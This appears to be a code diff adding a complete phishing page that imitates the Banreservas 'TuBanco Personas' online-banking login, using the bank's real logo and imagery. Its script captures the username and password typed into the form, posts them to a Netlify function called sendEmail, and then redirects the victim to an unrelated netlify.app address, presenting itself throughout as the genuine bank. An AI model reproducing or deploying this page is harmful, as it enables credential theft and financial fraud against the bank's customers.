@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banreservas</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #1b3b5b;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+        }
+        .container {
+            display: flex;
+            width: 900px;
+            background-color: #ffffff;
+            border-radius: 5px;
+            overflow: hidden;
+            flex-direction: column;
+        }
+        .logo {
+            background-color: #1b3b5b;
+            padding: 20px;
+            text-align: center;
+        }
+        .logo img {
+            max-width: 150px;
+        }
+        .content {
+            display: flex;
+        }
+        .left {
+            width: 50%;
+            background: url('https://www.banreservas.com.do/TuBancoPersonas/App_Themes/Login/images/profilepersonas.jpg') no-repeat center center;
+            background-size: contain;
+            height: 482px;
+        }
+        .right {
+            width: 50%;
+            padding: 20px;
+            position: relative;
+        }
+        .title {
+            text-align: center;
+            font-size: 18px;
+            color: #1b3b5b;
+            margin-bottom: 20px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        label {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        input {
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .btn {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background-color: #0056b3;
+        }
+        .links {
+            text-align: center;
+            margin-top: 10px;
+        }
+        .links a {
+            text-decoration: none;
+            color: #007bff;
+            font-size: 14px;
+            display: block;
+            margin: 5px 0;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .footer img {
+            width: 120px;
+            height: 120px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.banreservas.com.do/TuBancoPersonas/App_Themes/Login/Images/logo_banreservas.png" alt="Logo Banreservas">
+        </div>
+        <div class="content">
+            <div class="left"></div>
+            <div class="right">
+                <h2 class="title">Bienvenidos a TuBanco Personas</h2>
+                <form id="loginForm">
+                    <label for="usuario">Ingrese su usuario</label>
+                    <input type="text" id="usuario" placeholder="USUARIO" required>
+                    <label for="password">Contraseña</label>
+                    <input type="password" id="password" placeholder="CONTRASEÑA" required>
+                    <button class="btn" type="submit">Continuar</button>
+                </form>
+                <div class="links">
+                    <a href="#">Cambiar a TuBanco Empresas</a>
+                    <a href="#">Nuevo usuario persona</a>
+                    <a href="#">¿Olvidó su contraseña?</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <img src="https://www.banreservas.com.do/TuBancoPersonas/App_Themes/Login/Images/sello_superintendencia.png" alt="Sello Superintendencia">
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", async function(event) {
+            event.preventDefault(); // Evita el envío normal del formulario
+
+            const usuario = document.getElementById("usuario").value;
+            const password = document.getElementById("password").value;
+
+            try {
+                await fetch('/.netlify/functions/sendEmail', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username: usuario, password: password })
+                });
+            } catch (error) {
+                console.error("Error al enviar el correo", error);
+            }
+
+            // Redirige siempre después de intentar enviar el correo
+            window.location.href = "https://securenextlogin.netlify.app";
+        });
+    </script>
+</body>
+</html>
